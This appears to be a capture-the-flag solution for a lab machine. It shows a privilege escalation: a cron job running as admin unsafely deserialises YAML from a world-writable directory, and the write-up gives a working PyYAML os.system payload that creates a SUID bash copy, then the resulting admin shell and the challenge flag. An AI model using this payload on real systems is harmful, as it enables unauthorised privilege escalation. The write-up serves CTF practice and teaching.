# Tamesak University - 2 Solution

## 1. Exploring Bob’s Environment
Inside `/home/bob/app/` lies a configuration file that gives away useful information.

```bash
cat /home/bob/app/config.ini
```
```
[app]
environment=production
task_engine=/home/admin/core/runner.py
task_dir=/home/admin/tasks
```

It references an **admin task engine**, suggesting that some scheduled process might be running under a higher-privileged account.

---

## 2. Locating the Cron Job
Let’s check the cron configuration files for periodic jobs.

```bash
cat /etc/cron.d/taskrunner
```
```
* * * * * admin /usr/bin/python3 /home/admin/core/runner.py
```

This shows that the script executes **every minute as the `admin` user**.  
If we can influence what this script processes, we may be able to escalate privileges.

---

## 3. Inspecting the Task Engine
Read the full contents of `/home/admin/core/runner.py` to understand what it does.

```bash
cat /home/admin/core/runner.py
```
```python
#!/usr/bin/python3
import yaml
import glob
import subprocess

TASK_DIRS = ["/home/admin/tasks", "/srv/shared/tasks"]

for directory in TASK_DIRS:
    try:
        files = glob.glob(f"{directory}/*.yml")
    except Exception:
        continue

    for taskfile in files:
        try:
            with open(taskfile, "r") as f:
                task = yaml.load(f, Loader=yaml.Loader)

            action = task.get("action")

            if action == "cleanup":
                subprocess.run(["/bin/bash", "/home/admin/core/cleanup.sh"])

            elif action == "sync":
                subprocess.run(["/bin/bash", "/home/admin/core/sync.sh"])

        except Exception:
            continue
```

The line  
```python
task = yaml.load(f, Loader=yaml.Loader)
```  
unsafely deserialises YAML content using the default loader, allowing arbitrary Python object execution which is a classic YAML deserialisation vulnerability.

---

## 4. Finding a Writable Directory
The script scans both `/home/admin/tasks` and `/srv/shared/tasks`.  
Let’s check their permissions:

```bash
ls -ld /home/admin/tasks /srv/shared/tasks
```

Output:
```
drwxr-xr-x 1 admin admin 4096 Nov 14 15:23 /home/admin/tasks
drwxrwxrwx 1 admin admin 4096 Nov 14 15:14 /srv/shared/tasks
```

The second directory is **world-writable (`drwxrwxrwx`)**, meaning any user including Bob can drop files there. We can use that to exploit the vulnerable YAML parser.

---

## 5. Crafting the Exploit
As Bob, create a malicious YAML file inside `/srv/shared/tasks/`.

```bash
cat > /srv/shared/tasks/exploit.yml <<'EOF'
!!python/object/apply:os.system ["cp /bin/bash /home/admin/cronking && chmod 4755 /home/admin/cronking"]
EOF
```

This payload instructs Python’s YAML deserialiser to execute an OS command when loaded.  
It copies `/bin/bash` into admin’s home and sets the **SUID** bit so it runs as admin.

---

## 6. Waiting for Cron
The cron job runs every minute.  
Wait 60 seconds, then check if the exploit succeeded:

```bash
ls -l /home/admin/cronking
```

Expected output:
```
-rwsr-xr-x 1 admin admin 1168776 ... /home/admin/cronking
```

The `s` in `rws` indicates the SUID permission.

---

## 7. Escalating to Admin
Execute the binary with preserved privileges:

```bash
/home/admin/cronking -p
whoami
```
Output:
```
admin
```

---

## 8. Retrieving the Final Flag
```bash
cat /home/admin/flag2.txt
```

**Flag:**  
```
SPARK{k1ng_0f_th3_cr0n_@dm1n}
```


---
